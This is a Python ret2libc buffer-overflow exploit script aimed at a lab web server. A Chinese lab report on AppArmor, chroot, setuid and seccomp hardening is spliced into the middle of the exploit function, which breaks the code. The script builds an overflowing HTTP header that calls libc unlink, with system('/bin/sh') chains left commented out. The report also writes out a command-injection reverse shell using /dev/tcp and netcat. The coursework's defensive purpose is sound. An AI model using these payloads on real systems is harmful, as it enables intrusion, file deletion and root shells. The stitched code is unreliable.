#!/usr/bin/python
import sys
import socket
import traceback
import struct
import time
import os.path
import binascii
from pwn import *

# libc base address
# ASLR shoud be off, so that libc's base address will not change untill next reboot 
# you can use "ldd ./program" to check the libc base address
base_addr = 0xf7d7c000

# all of the offsets of functions (strings) inside libc won't change much (sometimes changed, so check is needed) .
# to get the offset of a funtion, you can use:
##  readelf -a /lib/i386-linux-gnu/libc.so.6 | grep " system"
# to get "/bin/sh":
## ropper --file /lib/i386-linux-gnu/libc.so.6 --string "/bin/sh"

# system
sys_addr = base_addr + 0x00041780 
# /bin/sh
sh_addr = base_addr + 0x0018e363
# exit
ex_addr = base_addr + 0x000340c0
# unlink
ul_addr = base_addr + 0x000f3e50
# dead
d_addr = 0xdeadbeef
# c0ffee00
c_addr = 0xc0ffee00

# ebp  too make the task simple, we print ebp of getToken function (vulnerable) 
ebp_addr = 0xffffd208



## Below is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the vulnerable web server and exploit it.

def build_exploit(shellcode):

    ul_arg = "/tmp/test.txt\0"
    ul_arg_addr = ebp_addr + 20

    sys_arg = "/bin/sh\0"
    sys_arg_addr = ebp_addr + 20

    req = ("POST / HTTP/1.1\r\n").encode('latin-1')
    # All of the header information other than "Content-Length" is not important
    req += ("Host: 127.0.0.1\r\n").encode('latin-1')
    # The Content-Length below is useful, and depends on the length of 
    # username plus password, you need to use wireshark (together with web browser) 
    # for checking the length
    req += ("Content-Length: 58\r\n").encode('latin-1') 
    req += ("Origin: http://127.0.0.1\r\n").encode('latin-1')
    req += ("Connection: keep-alive\r\n").encode('latin-1')
    req += ("Referer: http://127.0.0.1/\r\n").encode('latin-1')

    req += ("Hacking: ").encode('latin-1')
    # For different oses (and compilation), the length of fillup for 
    # hijacking the return address in the stack, could be different,
    # therefore you need to debug the program for checking and adjusting.
    req += b'A' * 1068 #  + b'C' * 4

    #req += p32(d_addr)

    # use "/bin/sh" string in libc
    #req += p32(sys_addr)
    #req += p32(ex_addr)
    #req += (sh_addr).to_bytes(4, byteorder='little')
    #req += p32(0)

    # put "/bin/sh" string in the stack
    # ebp is needed to locate the place of string 
    # Note: using this method, you can put arbitrary string in the stack, 
    # so that "system" can execute arbitrary command
    #req += p32(sys_addr)
    #req += p32(ex_addr)
    #req += p32(sys_arg_addr)
    #req += p32(0)
    #req += sys_arg.encode('latin-1')


    # remove a file specified by the path "ul_arg"
    req += p32(ul_addr)
    req += p32(ex_addr)
    req += p32(ul_arg_addr)
    req += p32(0)
    req += ul_arg.encode('latin-1')
    

    req += ("\r\n").encode('latin-1')
    req += ("\r\n").encode('latin-1')
   
    # Below is the username/password that you can Register into the web server
    # by using web browser. These information will be stored into the sqlite db behind.
    # You need to change these information according to your own registration.
 
    # Note that successful POST will be responded by the server with a hint page.
    # By using the successful response, you can judge whether the server has been 
    # crashed (by exploit), so that you can adjust the fillup accordingly.
    req += ("login_username=x123&login_password=123&submit_login=Login").encode('latin-1')

    print(req)
    return req

    1 实验二 系统安全实验
        1.1 实验目的
实验分为两部分，APPARMOR和进程约束。
AppArmor 是 linux 系统中提供的一种强制访问控制方法，与SELinux 类似，AppArmor 通过提供强制访问控制 (MAC) 来补充传统的 Linux 自主访问控制 (DAC) 。AppArmor 允许系统管理员通过为每个程序进行权限配置，来限制程序的功能。配置文件可以允许诸如网络访问、原始套接字访问以及在匹配路径上读取、写入或执行文件的权限等功能。本实验的学习目标是让学生根据不同程序的访问控制需求，使用AppArmor 进行访问控制配置，理解最小特权原则，并了解如何通过该方法抵御攻击。
特权隔离（Privilege Separation）、最小特权（LeastPrivilege）、安全的错误处理（Fail Securely）等等，是安全设计重要原则，本实验的目的是通过系统提供的安全机制，对程序进行安全增强。本实验涵盖以下方面：
1. chroot
2. 改变进程 euid
3. seccomp
4. AppArmor
        1.2 实验内容、步骤及结果
任务一：针对 ping (/bin/ping)程序，使用 apparmor 进行访问控制。尝试修改profile，使得 ping 程序的功能无法完成。

首先使用如下命令开启APPARMOR服务，并安装相关软件包


然后用如下命令为ping程序设置访问控制

然后将网络相关的权限设置为Deny或Ignore，访问控制配置具体如下图所示：

然后运行ping程序进行测试，观察到无法运行：


任务二：针对 ping (/bin/ping)程序，使用 apparmor 进行访问控制。尝试修改profile，使得 ping 程序的功能无法完成。
（1）编译下图的程序，设置 setuid root 权限；通过命令注入攻击，
创建 reverse shell。
（2）使用 apparmor 对该程序进行访问控制，禁止 attacker 通过命
令注入创建 reverse shell；
命令注入方法：./command “localfile; ls”
（3）使用 apparmor 对该程序进行访问控制，允许 attacker 通过命
令注入创建 reverse shell，但将 attacker 在 reverse shell 中的能使用的
命令限制为 ls, whoami；
首先是（1），代码如下图，文件名为command.c

使用命令编译该程序，并执行

开始进行监听和注入以实现反向shell的获取：
在一个终端先运行` nc -lnvp 9090`
在一个终端再运行
` sudo ./command "localfile; bash -c \"bash -i > /dev/tcp/127.0.0.1/9090 0<&1 2>&1\""`
可以看到获得了root权限

然后是（2）
使用AppArmor限制command程序对net的访问，注意当前目录是
/home/xzc/Desktop/lab2
然后写配置如下

执行命令
`sudo apparmor_parser -r /etc/apparmor.d/home.xzc.Desktop.lab2.command`
加载配置
对程序进行测试，观察到无法创建反向shell，如下图：

然后是（3）更改配置文件如下

然后执行下面命令 加载配置
`sudo apparmor_parser -r /etc/apparmor.d/home.xzc.Desktop.lab2.command`
类似于(2)中开两个终端 进行测试 发现成功权限控制以支持反向shell并限制仅能执行ls和whoami指令

然后是第二部分，进程约束。
任务一：chroot。
子任务一。
关闭地址随机化：sudo sysctl -w kernel.randomize_va_space=0

把课程发布的lab2文件夹复制到虚拟机中，用make编译。然后给touchstone添加setuid root权限，执行，如图：

然后打开 Firefox 浏览器，地址框内输入 127.0.0.1:80 登录 web server，点击 register 注册，注册后点击 login 登录。

再在/tmp文件夹下创建 test.txt 文件，内容填充 test，将owner设为root

打开 x01.py 文件，发现其中有几个地址量与本机环境稍有不符，对其中几个地址进行修改。

通过 ldd banksv 查到 libc_base 为 0xf7da3000



再通过 readelf -s查找 system、exit、unlink 的偏移分别为 0x00041360、0x00033ec0、0x000f2770。

用strings -tx 查找/bin/sh 字符串的偏移为 0x0018b363。
ebp 地址是根据touchstone运行终端返回的frame pointer确定，为0xffffccd8。
在x01.py中对以上地址进行修改。

重新运行touchstone，注意sudo运行，登录，然后注意此时ebp变了，需要更改代码里的ebp地址为新的framepoint，然后运行x01.py
pip install pwn 
pyhon3 x01.py 127.0.0.1 80
然后发现运行完毕后，tmp下的test.txt没了。

下面是子任务二。
按照要求需要修改 server.c ，增加 chroot 支持，并重新make。

然后make，执行touchstone，然后执行脚本。

注意此时链接库变了，因此地址也要及时更改，这里我们不用ldd查看，开启另一个终端，执行如下命令


banksv的pid是47610


拿到起始地址 0xf7db4000，去修改攻击脚本中的base_addr，然后重复子任务一。发现删除不掉test.txt。

然后是子任务三。
在jail目录下创建个server文件夹

修改脚本


	查找如下三个地址，然后写进脚本。


	用objdump -d banksv查找pop ebp地址



	注意运行jail中的touchstone后，可能修改脚本中ebp地址
	删除成功

然后是任务二
server.c和x01.py都用最初的代码进行更改，打开 server.c ，找到插入 setuid 代码的位置，插入代码 setresuid(1000,1000,1000)(一共三处),

 make，修改 x01.py 的部分地址并运行一次攻击，攻击完毕后在/tmp 文件夹下运行 ls 命令查看目录，发现 test.txt 文件并没有被删除 

然后是任务三
首先是默认拒绝。
首先安装相应库

然后修改banksv.c如下（部分代码）：


修改makefile

改完之后make，然后再走一遍任务一的流程，注意地址的问题，已经变成了i386





开启服务器，开始运行脚本，注意我们这里的脚本也是原始代码，因为每个小实验独立。默认拒绝，显式允许unlink，删除成功。

然后是默认允许，显式拒绝。


时刻注意修改ebp地址，运行攻击脚本，删除失败。

然后是任务四，APPARMOR。
由于四个任务互不干扰，再回到起点，然后make。开启两个终端，其中一个执行命令 sudo aa-genprof banksv ，另一个运行程序。

添加访问控制策略。按"F"生成配置文件：文件位置为/etc/apparmor.d/home.xzc.lab2.banksv
写配置如下

此时运行攻击脚本，可以看到无法删除tmp/test.txt

用dmesg查看 可以看到被 apparmor 拒绝执行

    #req += (addr1).to_bytes(4, byteorder='little')
    #req += ("@@@@").encode('latin-1')


def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ("").encode("latin-1")
    while len(rbuf):
      resp=resp+rbuf
      rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp


if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellcode = ""
    if(os.path.exists("shellcode.bin")):
      shellfile = open("shellcode.bin", "r")
      shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())
